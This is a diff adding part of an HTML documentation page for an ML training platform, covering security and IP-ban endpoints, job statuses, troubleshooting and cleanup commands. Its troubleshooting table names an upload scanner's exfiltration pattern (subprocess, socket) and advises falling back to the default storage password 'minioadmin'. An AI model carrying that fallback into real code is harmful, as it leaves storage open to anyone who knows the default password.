+    <div class="endpoint"><span class="method patch">PATCH</span><code>/api/v1/monitoring/drift/alerts/{id}</code><span>Acknowledge / resolve a drift alert</span></div>
+
+    <h3>Security</h3>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/dashboard</code><span>Aggregate stats: total IPs, banned, block rate, top threats</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/ips</code><span>List tracked IPs — ?banned_only=true&amp;min_threat=0.5</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/ips/{ip}</code><span>Full IP record with request samples</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/security/ips/{ip}/ban</code><span>Manually ban — { "reason": "...", "expires_hours": 24 }</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/security/ips/{ip}/ban</code><span>Unban</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/security/ips/{ip}</code><span>GDPR erasure</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/security/logs</code><span>Request logs — ?ip=&amp;blocked_only=&amp;path=&amp;page=&amp;limit=</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/security/logs</code><span>Clear logs — ?older_than_days=30</span></div>
+  </section>
+
+  <section id="job-lifecycle">
+    <h2>Job Lifecycle</h2>
+    <p>Poll <code class="inline">GET /api/v1/training/jobs/{job_id}</code> until you see a terminal status:</p>
+    <table>
+      <thead><tr><th>Status</th><th>Meaning</th><th>Next action</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">queued</code></td><td>Waiting for a worker</td><td>Wait and poll again</td></tr>
+        <tr><td><code class="inline">running</code></td><td>Worker is processing</td><td>Wait and poll again</td></tr>
+        <tr><td><code class="inline">completed</code></td><td>Model deployed — ready for inference</td><td>Call <code class="inline">POST /inference/{name}</code></td></tr>
+        <tr><td><code class="inline">failed</code></td><td>Error — see <code class="inline">error</code> field</td><td>Fix and rerun via <code class="inline">POST /jobs/{id}/rerun</code></td></tr>
+        <tr><td><code class="inline">cancelled</code></td><td>Cancelled by user</td><td>Trigger a new job</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="troubleshooting">
+    <h2>Troubleshooting</h2>
+
+    <h3>Common errors</h3>
+    <table>
+      <thead><tr><th>Error</th><th>Cause</th><th>Fix</th></tr></thead>
+      <tbody>
+        <tr><td>manifest.json not found</td><td>ZIP missing the file or wrong layout</td><td>Run <code class="inline">unzip -l model.zip</code> — ensure manifest.json appears in the listing</td></tr>
+        <tr><td>model_file not found in ZIP</td><td>model_file path doesn't match file in ZIP</td><td>Check manifest <code class="inline">model_file</code> matches the actual filename exactly</td></tr>
+        <tr><td>No module named '_user_inference'</td><td>Stale cached module from a previous deploy</td><td>Already handled by the platform — redeploy clears the cache</td></tr>
+        <tr><td>Unable to locate credentials</td><td>boto3 can't find S3 keys</td><td>Use <code class="inline">os.environ.get("S3_ACCESS_KEY") or "minioadmin"</code> in load_context — never pass None</td></tr>
+        <tr><td>NoSuchBucket</td><td>MinIO bucket not created</td><td>Run the minio-init service: <code class="inline">docker compose up minio-init</code></td></tr>
+        <tr><td>libGL.so.1 not found</td><td>OpenCV needs system libs</td><td>Already in Dockerfile — rebuild: <code class="inline">docker compose build --no-cache ml-service</code></td></tr>
+        <tr><td>Event loop is closed</td><td>Motor DB client cached across asyncio.run() calls</td><td>Already fixed — each task creates a fresh client</td></tr>
+        <tr><td>Trainer class not found</td><td>No <code class="inline">mlflow.pyfunc.PythonModel</code> subclass in script</td><td>Ensure your class inherits directly from <code class="inline">mlflow.pyfunc.PythonModel</code></td></tr>
+        <tr><td>403 IP_BANNED on trainer upload</td><td>Your IP was auto-banned (usually false positive from rapid testing)</td><td>Unban: <code class="inline">DELETE /api/v1/security/ips/{ip}/ban</code> or run the emergency unban command from the Security API section</td></tr>
+        <tr><td>Specifying columns using strings not supported</td><td>sklearn ColumnTransformer was built with string names but predict() passed a numpy array</td><td>In your predict(), always pass <code class="inline">pd.DataFrame([row], columns=feature_names)</code> — never a raw numpy array</td></tr>
+        <tr><td>File rejected: Data exfiltration pattern</td><td>Model ZIP contains code that matches scanner patterns (e.g. subprocess, socket)</td><td>For trainer .py files only ClamAV runs. For model ZIPs review the code for actual dangerous patterns; legitimate ML libraries are fine in trainer files.</td></tr>
+        <tr><td>Drift check returns no alerts (no baseline)</td><td><code class="inline">DriftBaseline</code> not set for this trainer</td><td>Call <code class="inline">POST /monitoring/drift/{trainer}/baseline</code> first. Requires ≥ 30 successful inference logs.</td></tr>
+        <tr><td>Drift check skipped: too few samples</td><td>Fewer than 30 inferences in the check window</td><td>Lower <code class="inline">hours</code> in the check request to widen the window, or wait for more traffic</td></tr>
+        <tr><td>Performance snapshot shows 0 requests</td><td>No <code class="inline">InferenceLog</code> docs in the window</td><td>The scheduler only writes snapshots for trainers with activity — force one via <code class="inline">POST /monitoring/performance/{trainer}/snapshot</code></td></tr>
+      </tbody>
+    </table>
+
+    <h3>Check container logs</h3>
+    <pre><code><span class="cm"># ML service (API + inference)</span>
+docker logs pms_ml --tail 50
+
+<span class="cm"># ML worker (training + deploy jobs)</span>
+docker logs pms_ml_worker --tail 50
+
+<span class="cm"># MLflow server</span>
+docker logs pms_mlflow --tail 20</code></pre>
+
+    <h3>Clean up stale deployments</h3>
+    <pre><code><span class="cm"># Delete all MongoDB deployment records</span>
+curl -X DELETE http://localhost:8030/api/v1/models
+
+<span class="cm"># Delete all MLflow registry versions</span>
+docker exec pms_mlflow python3 -c <span class="st">"
+import mlflow
+c = mlflow.tracking.MlflowClient('http://localhost:5000')
+for v in c.search_model_versions(\"name='my-model'\"):
+    c.delete_model_version('my-model', v.version)
+c.delete_registered_model('my-model')
+"</span>
+
+<span class="cm"># Clear extracted ZIP from shared volume</span>
+docker exec pms_ml_worker rm -rf /app/trainers/zip_models/my-model</code></pre>
+
+    <div class="callout danger">
+      <strong>After clearing MLflow registry</strong>
+      Always redeploy your ZIP or trigger retraining after clearing — existing inference calls will fail until a new deployment is created.
+    </div>
+  </section>
+
+</main>
+
+<script>
+  // Highlight active nav link on scroll
+  const links = document.querySelectorAll('nav a');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const link = document.querySelector(`nav a[href="#${e.target.id}"]`);
+        if (link) link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+  document.querySelectorAll('section[id]').forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
